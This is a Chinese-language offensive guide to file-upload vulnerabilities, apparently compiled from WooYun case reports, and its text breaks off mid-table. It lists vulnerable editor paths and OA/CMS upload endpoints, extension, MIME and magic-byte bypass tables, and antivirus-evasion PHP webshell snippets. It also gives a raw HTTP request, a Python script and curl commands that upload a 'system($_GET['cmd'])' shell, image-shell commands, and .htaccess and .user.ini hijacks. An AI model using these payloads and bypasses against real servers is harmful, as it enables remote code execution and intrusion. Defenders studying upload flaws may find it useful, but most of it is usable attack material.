# 文件上传漏洞深度分析

> 基于 WooYun 漏洞库 2,711 个文件上传漏洞案例提炼，取前 50 个高质量案例深度分析

---

## 1. 核心攻击模型

```
┌─────────────────────────────────────────────────────────────────────────┐
│                        文件上传漏洞攻击链                                 │
├─────────────────────────────────────────────────────────────────────────┤
│  上传点发现 → 检测绕过 → 路径获取 → 解析利用 → Webshell运行 → 后渗透     │
└─────────────────────────────────────────────────────────────────────────┘
```

### 攻击成功率核心公式

```
成功率 = P(绕过检测) × P(获取路径) × P(解析运行)
```

**关键洞察**：大多数防御仅关注"绕过检测"环节，忽略了路径泄露和解析配置问题。

---

## 2. 上传点识别矩阵

| 上传点类型 | 出现频率 | 风险等级 | 典型路径 | 利用难度 |
|-----------|---------|---------|---------|---------|
| **富文本编辑器** | 42% | 极高 | `/fckeditor/`, `/ewebeditor/`, `/ueditor/` | 低 |
| **头像上传** | 18% | 高 | `/upload/avatar/`, `/member/uploadfile/` | 中 |
| **附件/文档上传** | 15% | 高 | `/uploads/`, `/attachment/` | 中 |
| **后台功能上传** | 12% | 极高 | `/admin/upload/`, `/system/upload/` | 低 |
| **业务功能上传** | 8% | 中 | `/apply/`, `/submit/` | 高 |
| **导入功能** | 5% | 高 | `/import/`, `/excelUpload/` | 中 |

### 2.1 富文本编辑器漏洞分布

```
┌────────────────────────────────────────────────────────────────┐
│           编辑器漏洞占比 (基于50个案例统计)                      │
├────────────────────────────────────────────────────────────────┤
│  FCKeditor    ████████████████████████  48%                    │
│  eWebEditor   ██████████████  28%                              │
│  UEditor      ██████  12%                                      │
│  KindEditor   ████  8%                                         │
│   其他         ██  4%                                           │
└────────────────────────────────────────────────────────────────┘
```

### 2.2 高危编辑器路径速查表

| 编辑器 | 测试路径 | 上传接口 |
|-------|---------|---------|
| FCKeditor | `/FCKeditor/editor/filemanager/browser/default/connectors/test.html` | `/connectors/jsp/connector` |
| FCKeditor | `/FCKeditor/editor/filemanager/browser/default/browser.html` | `?Connector=connectors/jsp/connector` |
| eWebEditor | `/ewebeditor/admin/default.jsp` | `/uploadfile/` |
| UEditor | `/ueditor/controller.jsp?action=config` | `/ueditor/controller.jsp` |

---

## 3. 绕过检测方法论

### 3.1 检测类型与绕过策略矩阵

| 检测类型 | 检测位置 | 绕过方法 | 成功率 | 案例ID |
|---------|---------|---------|-------|--------|
| **JavaScript验证** | 客户端 | 禁用JS/Burp拦截修改 | 95% | wooyun-2014-068939 |
| **扩展名黑名单** | 服务端 | 大小写/双写/特殊扩展名 | 70% | wooyun-2015-0108457 |
| **扩展名白名单** | 服务端 | %00截断/解析漏洞 | 40% | wooyun-2016-0167456 |
| **Content-Type** | HTTP头 | 修改为image/jpeg | 85% | wooyun-2016-0212792 |
| **文件头检测** | 文件内容 | 添加GIF89a头 | 75% | - |
| **内容检测** | 文件内容 | 图片马/编码绕过 | 60% | - |

### 3.2 扩展名绕过详解

#### 3.2.1 黑名单绕过技巧

```
┌─────────────────────────────────────────────────────────────────────────┐
│                          扩展名绕过速查表                                │
├─────────────────────────────────────────────────────────────────────────┤
│  技巧类型          │ PHP环境              │ ASP/ASPX环境   │ JSP环境    │
├─────────────────────────────────────────────────────────────────────────┤
│  大小写变形        │ .Php .pHp .PHP       │ .Asp .aSp      │ .Jsp .jSp  │
│  双写绕过          │ .pphphp              │ .asaspp        │ .jsjspp    │
│  特殊扩展名        │ .php3 .php5 .phtml   │ .asa .cer .cdx │ .jspx .jspa│
│  空格/点绕过       │ .php .                │ .asp.           │ .jsp.      │
│  ::$DATA流         │ N/A                  │ .asp::$DATA    │ N/A        │
│  %00截断           │ .php%00.jpg          │ .asp%00.jpg    │ .jsp%00.jpg│
│  分号截断(IIS)     │ N/A                  │ .asp;.jpg      │ N/A        │
└─────────────────────────────────────────────────────────────────────────┘
```

#### 3.2.2 实战绕过案例

**案例1: 万户OA截断绕过** (wooyun-2014-064031)
```
原始文件: shell.jsp
绕过方式: shell.jsp%00.jpg (URL解码后截断)
上传接口: /defaultroot/dragpage/upload.jsp
```

**案例2: HTTP Response修改绕过** (wooyun-2015-0108457)
```
技巧: 修改服务器返回的允许类型列表
步骤:
1. 拦截服务器Response
2. 修改allowedTypes包含jsp
3. 正常上传jsp文件
```

### 3.3 Content-Type绕过

| 原始类型 | 修改为 | 适用场景 |
|---------|-------|---------|
| `application/octet-stream` | `image/jpeg` | 通用 |
| `application/x-php` | `image/gif` | PHP环境 |
| `text/plain` | `image/png` | 文本类脚本 |

### 3.4 文件内容绕过

```
图片马制作方法:
GIF89a
(恶意代码内容)

或使用copy命令合并:
copy /b image.gif+shell.php shell.gif
```

---

## 4. 解析漏洞利用

### 4.1 解析漏洞全景图

```
┌─────────────────────────────────────────────────────────────────────────┐
│                          Web服务器解析漏洞                               │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  IIS 5.x/6.0                                                            │
│  ├── 目录解析: /shell.asp/1.jpg  → 解析为ASP                            │
│  ├── 文件解析: shell.asp;.jpg    → 解析为ASP                            │
│  └── 畸形解析: shell.asp.jpg     → 可能解析为ASP                        │
│                                                                         │
│  Apache                                                                 │
│  ├── 多后缀解析: shell.php.xxx   → 从右向左解析,遇到可识别后缀即运行    │
│  ├── .htaccess: AddType application/x-httpd-php .jpg                   │
│  └── 换行解析: shell.php%0a      → CVE-2017-15715                      │
│                                                                         │
│  Nginx                                                                  │
│  ├── 畸形解析: /1.jpg/shell.php  → 解析为PHP (cgi.fix_pathinfo=1)       │
│  ├── 空字节: shell.jpg%00.php    → 老版本漏洞                           │
│  └── CVE-2013-4547: shell.jpg \0.php → 需特定版本                      │
│                                                                         │
│  Tomcat                                                                 │
│  └── PUT方法: PUT /shell.jsp/    → CVE-2017-12615                      │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

### 4.2 IIS 6.0 解析漏洞实战

**案例: FCKeditor + IIS6解析** (wooyun-2015-0138435)

```
上传文件: ali.asp;ali.jpg
实际解析: ali.asp (分号后内容被忽略)
Shell路径: /Fckeditor/UserFiles/File/ali.asp;ali(2).jpg

关键点: 连续上传两次可成功
原因: 第一次可能失败,第二次重命名后分号位置变化
```

### 4.3 Apache 解析漏洞实战

**案例: 多后缀解析**
```
上传文件: shell.php.xxx
Apache配置: 未识别.xxx后缀时继续向左解析
结果: 作为PHP运行

防御绕过: 当.php被禁止时
尝试: .php3, .php5, .phtml, .phar
```

### 4.4 Nginx 解析漏洞实战

**案例: PHP-CGI解析漏洞** (wooyun-2015-0158311)
```
正常上传: test.jpg (内含PHP代码)
访问路径: /upload/test.jpg/.php
或: /upload/test.jpg/shell.php

前提条件:
- cgi.fix_pathinfo = 1 (PHP配置)
- Nginx未做安全限制
```

---

## 5. Webshell 技巧

### 5.1 一句话木马变形

| 语言 | 基础形式 | 变形技巧 |
|-----|---------|---------|
| **PHP** | 动态代码运行 | 变量拼接/回调函数 |
| **ASP** | request对象调用 | Unicode编码 |
| **ASPX** | Page Language方式 | 加密混淆 |
| **JSP** | Runtime.getRuntime | 使用JSPX格式 |

### 5.2 免杀技巧

```
PHP变量函数:
$a = 'as'.'sert';
$a($_POST['x']);

PHP回调函数:
array_map('assert', array($_POST['x']));

PHP动态调用:
$f = create_function('', $_POST['x']);
$f();
```

### 5.3 JSPX 绕过WAF

**案例: FCKeditor JSPX上传** (wooyun-2015-0149146)

JSPX是JSP的XML格式变体，具有以下特点:
- WAF通常检测`.jsp`而忽略`.jspx`
- Tomcat默认支持JSPX解析
- 可绑定命名空间运行任意代码

---

## 6. 常见漏洞CMS/框架

### 6.1 高危目标统计

```
┌────────────────────────────────────────────────────────────────┐
│              漏洞CMS/框架分布 (基于50个案例)                    │
├────────────────────────────────────────────────────────────────┤
│  OA系统(万户/用友/金蝶)     ████████████████  32%              │
│  政务系统                   ██████████  20%                    │
│  FCKeditor集成站            ████████  16%                      │
│  教育系统                   ██████  12%                        │
│  PHP CMS(Jeecms/Finecms)   ████  8%                           │
│  企业门户                   ████  8%                           │
│  其他                       ██  4%                             │
└────────────────────────────────────────────────────────────────┘
```

### 6.2 高危CMS漏洞速查

| CMS/系统 | 漏洞类型 | 漏洞路径 | 利用条件 |
|---------|---------|---------|---------|
| **万户OA ezOffice** | 任意文件上传 | `/defaultroot/dragpage/upload.jsp` | 截断绕过 |
| **用友协作平台** | 任意文件上传 | `/oaerp/ui/sync/excelUpload.jsp` | 绕过JS限制 |
| **金蝶GSiS** | 任意文件上传 | `/kdgs/core/upload/upload.jsp` | 注册用户即可 |
| **Jeecms** | 任意文件上传 | 后台模板功能 | 需后台权限 |
| **Finecms** | 竞争条件上传 | `/member/controllers/Account.php` | 注册用户即可 |
| **PHPEMS** | 任意文件上传 | `/app/document/api.php` | 无后缀检测 |
| **EnableQ** | 任意文件上传 | 多处上传点 | 无需登录 |

### 6.3 通用型漏洞模式

**模式1: 后台功能无鉴权**
```
问题: 上传功能未校验登录状态
案例: wooyun-2015-0123700 (高校就业信息系统)
路径: /Adminiscentertrator/AdmLinkInsert.asp
利用: 仅靠JavaScript跳转,禁用JS即可访问
```

**模式2: 导入功能未限制**
```
问题: Excel/文件导入功能可上传任意文件
案例: wooyun-2014-074398 (用友协作平台)
路径: /oaerp/ui/sync/excelUpload.jsp
利用: 绕过JS限制,爆破文件名
```

**模式3: 竞争条件漏洞**
```
问题: 上传后删除存在时间差
案例: wooyun-2014-063369 (Finecms)
利用: 多线程上传+访问,在删除前运行
技术: 恶意文件生成新文件,新文件不被删除
```

---

## 7. 上传路径获取技巧

### 7.1 路径泄露方式

| 方式 | 描述 | 案例 |
|-----|-----|-----|
| **响应直接返回** | 上传成功后返回完整路径 | 大多数案例 |
| **预览功能** | 查看已上传文件获取路径 | wooyun-2015-0108457 |
| **目录遍历** | FCKeditor connector遍历目录 | wooyun-2015-0152437 |
| **路径规则猜测** | 时间戳+随机数命名规则 | wooyun-2014-074398 |
| **报错信息** | 错误页面泄露路径 | - |
| **源码审计** | 分析代码获取命名规则 | - |

### 7.2 命名规则爆破

**案例: 时间戳命名爆破** (wooyun-2014-074398)
```
命名规则: 上传时间(精确到秒) + 原文件名
例如: 20140829221136jsp.jsp

爆破方法:
1. 记录上传时间
2. 爆破秒数偏差 (±60秒)
3. 尝试访问获取Shell
```

---

## 8. 防御绕过思维框架

### 8.1 INTJ式系统分析

```
┌─────────────────────────────────────────────────────────────────────────┐
│                         防御机制逆向分析框架                             │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  第一层: 识别防御点                                                      │
│  ├── 客户端检测? (JS/Flash限制)                                         │
│  ├── 服务端检测? (扩展名/Content-Type/内容)                             │
│  └── WAF检测? (特征匹配/行为分析)                                       │
│                                                                         │
│  第二层: 分析检测逻辑                                                    │
│  ├── 黑名单还是白名单?                                                  │
│  ├── 检测顺序如何?                                                      │
│  └── 是否有逻辑漏洞?                                                    │
│                                                                         │
│  第三层: 构造绕过向量                                                    │
│  ├── 单点绕过: 针对特定检测                                             │
│  ├── 组合绕过: 多技术联合                                               │
│  └── 逻辑绕过: 利用设计缺陷                                             │
│                                                                         │
│  第四层: 验证与迭代                                                      │
│  ├── 测试绕过有效性                                                     │
│  ├── 分析失败原因                                                       │
│  └── 调整绕过策略                                                       │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

### 8.2 决策树

```
                        ┌─────────────────┐
                        │ 发现上传功能    │
                        └────────┬────────┘
                                 │
                    ┌────────────▼────────────┐
                    │ 是否有客户端限制?        │
                    └────────────┬────────────┘
                          Yes    │    No
                    ┌────────────┴────────────┐
                    │                         │
            ┌───────▼───────┐         ┌───────▼───────┐
            │ 禁用JS/拦截包  │         │ 直接上传测试  │
            └───────┬───────┘         └───────┬───────┘
                    │                         │
                    └────────────┬────────────┘
                                 │
                    ┌────────────▼────────────┐
                    │ 服务端返回什么错误?      │
                    └────────────┬────────────┘
                                 │
        ┌────────────────────────┼────────────────────────┐
        │                        │                        │
┌───────▼───────┐        ┌───────▼───────┐        ┌───────▼───────┐
│ 扩展名错误     │        │ 内容类型错误  │        │ 文件内容错误  │
└───────┬───────┘        └───────┬───────┘        └───────┬───────┘
        │                        │                        │
┌───────▼───────┐        ┌───────▼───────┐        ┌───────▼───────┐
│ 尝试扩展名绕过 │        │ 修改Content-  │        │ 添加文件头/   │
│ 大小写/截断等  │        │ Type头        │        │ 制作图片马    │
└───────────────┘        └───────────────┘        └───────────────┘
```

---

## 9. 关键洞察

### 9.1 攻击者视角的元认知

1. **编辑器是最大突破口**: 42%的案例涉及富文本编辑器，且大多数网站未更新编辑器版本

2. **前端验证=无验证**: 100%的纯前端验证都可绕过，这是最低级但最常见的错误

3. **路径泄露被严重忽视**: 即使上传成功，路径未返回也难以利用；但大多数系统都会泄露路径

4. **服务器配置是最后防线**: IIS 6.0解析漏洞至今仍在大量政企系统中存在

5. **竞争条件是高级绕过手段**: 当所有检测都正确时，利用删除时间差仍可getshell

---

## 10. 实战Checklist

### 10.1 渗透测试检查项

- [ ] 扫描常见编辑器路径
- [ ] 测试各类上传点（头像、附件、导入）
- [ ] 禁用JavaScript测试前端验证
- [ ] 测试扩展名绕过（大小写、双写、截断）
- [ ] 测试Content-Type修改
- [ ] 测试文件头绕过
- [ ] 识别服务器类型，测试对应解析漏洞
- [ ] 分析文件命名规则
- [ ] 测试目录遍历获取路径
- [ ] 测试竞争条件上传

### 10.2 快速漏洞验证

```
FCKeditor 快速检测:
访问 /FCKeditor/editor/filemanager/browser/default/connectors/test.html

目录遍历测试 (FCKeditor):
访问 /FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=/../

IIS解析漏洞测试:
上传 shell.asp;.jpg 并访问
```

---

## 附录: 案例索引

| 案例ID | 关键技术 | 目标类型 |
|-------|---------|---------|
| wooyun-2015-0108457 | HTTP Response修改 | 交通系统 |
| wooyun-2015-0135258 | FCKeditor | 公共交通 |
| wooyun-2016-0167456 | %00截断 | 金融系统 |
| wooyun-2014-064031 | 截断绕过 | 万户OA |
| wooyun-2015-090186 | eWebEditor | 政府采购 |
| wooyun-2014-063369 | 竞争条件 | Finecms |
| wooyun-2015-0126541 | 架构分析 | 万户ezOffice |
| wooyun-2015-0149146 | JSPX绕过 | 保险系统 |
| wooyun-2015-0158311 | 解析漏洞 | 门户网站 |
| wooyun-2016-0212792 | 扩展名绕过 | 运营商 |

---

---

## 12. 绕过技术全景 (增强版)

### 12.1 绕过技术的分类体系

```
┌─────────────────────────────────────────────────────────────────────────┐
│                      文件上传绕过技术完整分类                             │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  【层级1: 客户端绕过】                                                  │
│  ├── 禁用JavaScript                                                     │
│  ├── 修改HTML表单限制                                                   │
│  ├── 使用Burp Suite拦截修改                                             │
│  ├── 浏览器开发者工具移除属性                                            │
│  └── Curl/Python直接POST请求                                            │
│                                                                         │
│  【层级2: 服务端扩展名绕过】                                            │
│  ├── 大小写变异: .Php .pHp .PHP5                                        │
│  ├── 双写绕过: .pphphp .asaspp                                          │
│  ├── 特殊后缀: .php3 .php5 .phtml .phps                                 │
│  ├── 空字符/点: .php. .php%00.jpg                                       │
│  ├── 流包装器(Windows): .asp::$DATA                                     │
│  ├── 分号截断(IIS): .asp;.jpg                                            │
│  ├── 换行符(Apache): .php\x0a (CVE-2017-15715)                         │
│  └── 双重扩展名: shell.php.jpg                                          │
│                                                                         │
│  【层级3: MIME类型伪造】                                                │
│  ├── 基础伪装: image/jpeg, image/gif, image/png                         │
│  ├── 其他类型: application/octet-stream                                 │
│  ├── 多部分类型: multipart/form-data边界操纵                            │
│  └── 空类型/无类型: 不设置Content-Type                                   │
│                                                                         │
│  【层级4: 文件内容绕过】                                                │
│  ├── 文件头伪造: GIF89a, PNG头, JPEG头                                  │
│  ├── 图片马: copy /b image.jpg+shell.php                                │
│  ├── 注入混淆: <?php ?>藏在图片EXIF中                                    │
│  ├── 编码绕过: base64, rot13, XOR加密                                   │
│  ├── 条件竞争: 上传后访问前删除                                          │
│  └── 结构操纵: 修改文件结构但保留可执行性                                │
│                                                                         │
│  【层级5: 服务器配置利用】                                              │
│  ├── IIS 6.0解析漏洞: /shell.asp/1.jpg                                  │
│  ├── Apache多后缀: shell.php.xxx                                        │
│  ├── Nginx CGI漏洞: /image.jpg/shell.php                                │
│  ├── .htaccess操纵: 重写解析规则                                         │
│  ├── 用户配置文件: .user.ini, .htaccess                                 │
│  └── 服务器版本漏洞: 特定版本CVE                                         │
│                                                                         │
│  【层级6: 逻辑漏洞利用】                                                │
│  ├── 重命名漏洞: 上传合法文件,重命名为恶意                               │
│  ├── 路径遍历: ../../shell.php                                          │
│  ├── 时间竞争: 上传-检测-删除时间差                                      │
│  ├── 二次注入: 先上传后利用其他功能                                      │
│  ├── 权限提升: 低权限上传+高权限执行                                     │
│  └── 存储型XSS: 上传HTML文件利用XSS                                      │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

### 12.2 前端JavaScript验证绕过详解

#### 12.2.1 绕过技术矩阵

| 绕过方法 | 技术原理 | 适用场景 | 成功率 | 检测难度 |
|---------|---------|---------|--------|---------|
| **禁用JS** | 浏览器设置不执行JS | 所有前端验证 | 100% | 无 |
| **拦截修改** | Burp拦截HTTP包修改 | 所有前端验证 | 100% | 中 |
| **修改HTML** | 删除accept属性,修改onsubmit | 表单限制 | 95% | 低 |
| **Curl请求** | 直接构造POST绕过浏览器 | 所有场景 | 100% | 中 |
| **API调用** | Python/Go直接HTTP请求 | 自动化测试 | 100% | 高 |
### 12.3 MIME类型验证绕过详解

#### 12.3.1 绕过技术矩阵

| 检测方式 | 绕过技术 | 技术细节 | 成功率 |
|---------|---------|---------|--------|
| **简单MIME检查** | 修改Content-Type头 | image/jpeg, image/gif等 | 95% |
| **白名单MIME** | 伪装成允许类型 | 使用图片类型的MIME | 90% |
| **MIME+扩展名** | 同时修改两者 | 一致性伪装 | 85% |
| **完整检查** | 需结合其他绕过 | 文件头+内容绕过 | 60% |

#### 12.3.2 常用MIME类型速查表

```python
# 图片类型 (最常用)
image/jpeg    # JPEG图片
image/gif     # GIF图片
image/png     # PNG图片
image/bmp     # BMP图片
image/webp    # WebP图片

# 文档类型
application/pdf         # PDF文档
application/msword      # Word文档
application/vnd.ms-excel  # Excel文档

# 通用类型
application/octet-stream  # 二进制流(很多系统接受)
multipart/form-data       # 表单上传(标准)

# 其他类型
text/plain               # 纯文本
text/html                # HTML
application/json         # JSON数据
```

#### 12.3.3 实战绕过示例

**场景1: PHP后端检查$_FILES类型**
```php
// 服务端验证代码(有漏洞)
$allowed_types = ['image/jpeg', 'image/png', 'image/gif'];
if (!in_array($_FILES['file']['type'], $allowed_types)) {
    die("只允许上传图片");
}

// 绕过方法: 修改HTTP头
POST /upload.php HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg    ← 关键: 修改为图片类型

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--
```

**场景2: Python/Go伪造上传**
```python
import requests

# 方法1: 直接指定Content-Type
files = {
    'file': ('shell.jpg',           # 文件名(可伪装)
             open('shell.php', 'rb'),  # 实际内容
             'image/jpeg')           # MIME类型(伪造)
}
r = requests.post('http://target/upload.php', files=files)

# 方法2: 完全控制请求
import requests
from io import BytesIO

# 构造multipart/form-data
payload = BytesIO()
boundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW'

# 构造请求体...
headers = {
    'Content-Type': f'multipart/form-data; boundary={boundary}'
}
```

**场景3: MIME+扩展名双重伪装**
```bash
# 使用curl修改
curl -X POST http://target/upload.php \
  -F "file=@shell.php;filename=shell.jpg" \
  -H "Content-Type: image/jpeg" \
  -H "X-File-Type: image/jpeg"

# 或使用Burp:
# 1. 上传shell.php
# 2. 拦截请求
# 3. 修改Content-Disposition中的filename为shell.jpg
# 4. 修改Content-Type为image/jpeg
```

### 12.4 文件头检测绕过详解

#### 12.4.1 常见文件头(Magic Number)速查表

```
┌─────────────────────────────────────────────────────────────────────────┐
│                          常见文件Magic Number表                          │
├─────────────────────────────────────────────────────────────────────────┤
│  文件类型   │ Magic Number(十六进制) │ ASCII表示    │ 偏移量            │
├─────────────────────────────────────────────────────────────────────────┤
│  JPEG       │ FF D8 FF               │ ÿØÿ          │ 0                │
│  PNG        │ 89 50 4E 47            │ .PNG         │ 0                │
│  GIF        │ 47 49 46 38            │ GIF8         │ 0                │
│  BMP        │ 42 4D                  │ BM           │ 0                │
│  TIFF       │ 49 49 2A 00            │ II*.         │ 0                │
│  ICO        │ 00 00 01 00            │ ....         │ 0                │
│  WebP       │ 52 49 46 46            │ RIFF         │ 0                │
├─────────────────────────────────────────────────────────────────────────┤
│  PDF        │ 25 50 44 46            │ %PDF         │ 0                │
│  ZIP        │ 50 4B 03 04            │ PK..         │ 0                │
│  RAR        │ 52 61 72 21            │ Rar!         │ 0                │
│  7Z         │ 37 7A BC AF 27 1C      │ 7z¼¯'        │ 0                │
├─────────────────────────────────────────────────────────────────────────┤
│  MP3        │ 49 44 33              │ ID3          │ 0                │
│  WAV        │ 52 49 46 46            │ RIFF         │ 0                │
│  AVI        │ 52 49 46 46            │ RIFF         │ 0                │
├─────────────────────────────────────────────────────────────────────────┤
│  ELF        │ 7F 45 4C 46            │ .ELF         │ 0                │
│  EXE        │ 4D 5A                  │ MZ           │ 0                │
└─────────────────────────────────────────────────────────────────────────┘
```

#### 12.4.2 文件头伪造技术

**方法1: 简单添加文件头**
```php
// GIF文件头
GIF89a<?php system($_POST['cmd']); ?>

// JPEG文件头
FF D8 FF<?php system($_POST['cmd']); ?>

// PNG文件头
89 50 4E 47<?php system($_POST['cmd']); ?>
```

**方法2: 图片马制作(命令行)**
```bash
# Windows
copy /b image.gif+shell.php shell.gif

# Linux/Mac
cat image.gif shell.php > shell.gif

# 使用dd命令
dd if=image.gif of=shell.gif bs=1 count=6
cat shell.php >> shell.gif

# 使用exiftool注入PHP到EXIF
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
```

**方法3: 使用PHP生成图片马**
```php
<?php
// 读取原始图片
$image = imagecreatefromjpeg('original.jpg');

// 添加注释(隐藏PHP代码)
// 注意: 这种方法需要配合文件包含漏洞
imagepng($image, 'shell_with_php.jpg');
imagedestroy($image);

// 或者在图片元数据中注入
$exif = array(
    'Comment' => '<?php system($_GET["cmd"]); ?>'
);
```

**方法4: 二进制文件头构造**
```python
# Python脚本构造图片马
def create_fake_gif(php_code):
    gif_header = b'GIF89a'
    return gif_header + php_code.encode()

# 使用示例
php_code = "<?php system($_POST['cmd']); ?>"
fake_gif = create_fake_gif(php_code)

with open('shell.gif', 'wb') as f:
    f.write(fake_gif)
```

**案例3: 图片尺寸检测绕过**
```php
// 服务端检测(有漏洞)
$info = getimagesize($_FILES['file']['tmp_name']);
if (!$info || $info[0] < 1 || $info[1] < 1) {
    die("不是有效的图片");
}

// 绕过: 构造包含完整图片结构的PHP文件
// 需要保证PHP代码不破坏图片结构
```

#### 12.4.4 高级绕过: 利用图片解析漏洞

**方法1: 使用Polyglot文件**
```bash
# 一个文件同时是GIF和ZIP
# GIF部分: GIF89a
# ZIP部分: PK..
# 可作为有效图片上传,但ZIP部分可被解压
```

**方法2: 利用EXIF数据**
```bash
# 使用exiftool在EXIF中注入代码
exiftool -Comment='<?php system($_GET["x"]); ?>' image.jpg

# 配合LFI漏洞使用
# /image.php?file=uploads/image.jpg
# 如果include()这个文件,EXIF中的PHP会被执行
```

**方法3: 使用Steganography(隐写术)**
```bash
# 使用steghide工具将PHP隐藏在图片中
steghide embed -cf image.jpg -ef shell.php
steghide extract -sf image.jpg

# 注意: 需要配合文件包含漏洞
```

---

## 13. 黑名单 vs 白名单验证 (深度分析)

```

### 13.2 黑名单绕过技术详解

#### 13.2.1 黑名单的典型漏洞

```php
// 糟糕的黑名单实现
$blacklist = ['php', 'php5', 'php4', 'asp', 'aspx', 'jsp'];
$ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));

if (in_array($ext, $blacklist)) {
    die("不允许上传该类型文件");
}
// 继续处理上传...

// 可被以下方式绕过:
// 1. .phtml (未在黑名单中)
// 2. .php3 .php7 .phps (变体未包含)
// 3. .PHP (大小写,如果忘记strtolower)
// 4. .php%00.jpg (空字节截断)
// 5. .php. (点后缀)
// 6. .php::$DATA (Windows流)
```

#### 13.2.2 黑名单绕过技术矩阵

| 绕过技术 | 原理 | PHP示例 | ASP示例 | JSP示例 | 成功率 |
|---------|------|---------|---------|---------|--------|
| **大小写** | 黑名单未统一大小写 | .Php .pHp | .AsP .aSp | .JsP .jSp | 80% |
| **双写** | 替换后仍包含黑名单 | .pphphp | .asaspp | .jsjspp | 70% |
| **特殊后缀** | 黑名单不完整 | .phtml .phps | .asa .cer | .jspx .jsw | 90% |
| **空字符** | 截断后续字符 | .php%00.jpg | .asp%00.gif | .jsp%00.png | 85% |
| **点后缀** | 某些系统忽略末尾点 | .php. | .asp. | .jsp. | 75% |
| **分号截断** | IIS特性 | N/A | .asp;.jpg | N/A | 95% |
| **::$DATA** | NTFS流 | N/A | .asp::$DATA | N/A | 90% |
| **换行符** | Apache CVE | .php\x0a | N/A | N/A | 60% |
| **双扩展名** | 只检查最后一个 | .php.jpg | .asp.gif | .jsp.png | 85% |

#### 13.2.3 实战黑名单绕过案例

**案例1: Wooyun-2015-0127845分析**
```json
{
  "detail": "上传功能未正确验证文件类型，上传.php文件被执行"
}

// 推测的原始代码(有漏洞)
function isAllowedFile($filename) {
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));

    // 黑名单方式(可能实现不完整)
    $dangerous = ['php', 'php5', 'asp', 'jsp', 'exe', 'sh'];
    return !in_array($ext, $dangerous);
}

// 绕过方法:
// 1. 尝试 .phtml (如果黑名单未包含)
// 2. 尝试 .php3 .php7 .pht (变体)
// 3. 尝试大小写绕过 .P HP .pHp
// 4. 尝试 .php%00.jpg (空字节截断)
// 5. 尝试 .php. (末尾加点)
// 6. 尝试 .php::$DATA (如果Windows服务器)

// 最可能成功的绕过: .phtml 或 .php.xxx (多后缀)
```

**案例2: 替换型黑名单绕过**
```php
// 有漏洞的实现
function sanitizeFilename($filename) {
    // 尝试替换危险扩展名
    $filename = str_replace(['.php', '.asp'], '', $filename);
    return $filename;
}

// 绕过示例:
// 上传: shell.pphphp
// 替换后: shell.php (第一次替换.php为空,剩下.php)
// 最终文件: shell.php

// 或使用双写:
// 上传: shell.asaspp
// 替换后: shell.asp
```

**案例3: 正则黑名单绕过**
```php
// 有漏洞的正则实现
$blacklist_pattern = '/\.(php|asp|jsp)$/i';
if (preg_match($blacklist_pattern, $filename)) {
    die("危险文件类型");
}

// 绕过方法:
$filename = "shell.phtml";  // 不匹配正则
$filename = "shell.php5";   // 不匹配正则
$filename = "shell.php.jpg"; // 匹配.jpg结尾

// 或使用换行符(某些PHP版本)
$filename = "shell.php\n";  // 正则可能不匹配\n
```

### 13.3 白名单绕过技术详解

#### 13.3.1 白名单的典型实现

```php
// 推荐的白名单实现
function isAllowedFileType($filename) {
    // 定义允许的扩展名
    $allowed_extensions = ['jpg', 'jpeg', 'png', 'gif', 'pdf'];

    // 获取文件扩展名
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));

    // 白名单检查
    if (!in_array($ext, $allowed_extensions)) {
        return false;
    }

    return true;
}
```

#### 13.3.2 白名单绕过方法(虽然困难)

| 绕过技术 | 原理 | 利用条件 | 难度 |
|---------|------|---------|------|
| **解析漏洞** | 上传白名单文件但特殊解析 | IIS/Apache/Nginx漏洞 | 高 |
| **双扩展名** | shell.php.jpg被解析为php | Apache多后缀配置 | 中 |
| **空字节截断** | shell.php%00.jpg | PHP<5.3.4 | 高 |
| **配置文件** | 上传.htaccess/.user.ini | 允许txt/配置文件 | 中 |
| **文件包含** | 上传图片马+LFI利用 | 存在文件包含漏洞 | 高 |

#### 13.3.3 白名单绕过实战案例

**案例1: Apache多后缀解析绕过**
```php
// 白名单检查
$allowed = ['jpg', 'png', 'gif'];
$filename = $_FILES['file']['name'];
$ext = pathinfo($filename, PATHINFO_EXTENSION);

// 上传文件: shell.php.jpg
// 白名单检查: 通过 (扩展名是jpg)
// Apache解析: 从右向左,遇到.php即执行
// 实际执行: 作为PHP文件运行

// 防御: 不仅检查扩展名,还要重命名文件
```

**案例2: 上传配置文件劫持解析**
```php
// 场景: 白名单允许.txt文件
// 上传: .htaccess文件

// .htaccess内容:
<FilesMatch "\.jpg$">
  SetHandler application/x-httpd-php
</FilesMatch>

// 效果: 所有.jpg文件会被作为PHP执行
// 配合图片马使用

// 或者上传.user.ini文件(PHP FastCGI)
auto_prepend_file=shell.jpg

// 效果: 所有PHP文件执行前自动包含shell.jpg
```

**案例3: 空字节截断绕过(老版本PHP)**
```php
// PHP<5.3.4版本
$filename = "shell.php\x00.jpg";

// pathinfo()返回: jpg (白名单通过)
// 文件系统保存: shell.php (空字节截断)
// 结果: PHP文件被保存并执行

// 防御: 升级PHP版本,过滤空字节
```

---

## 14. 常见Webshell上传位置 (新增)

### 14.1 高危上传点分类

```
┌─────────────────────────────────────────────────────────────────────────┐
│                      Webshell上传位置风险矩阵                             │
├─────────────────────────────────────────────────────────────────────────┤
│  位置类型                │ 风险等级 │ 访问难度 │ 持久化能力 │ 发现难度     │
├─────────────────────────────────────────────────────────────────────────┤
│  1. 富文本编辑器目录     │ ★★★★★  │ 低      │ 强        │ 低           │
│  2. 用户头像上传         │ ★★★★☆  │ 中      │ 中        │ 低           │
│  3. 附件/文档目录        │ ★★★★☆  │ 中      | 中        │ 中           │
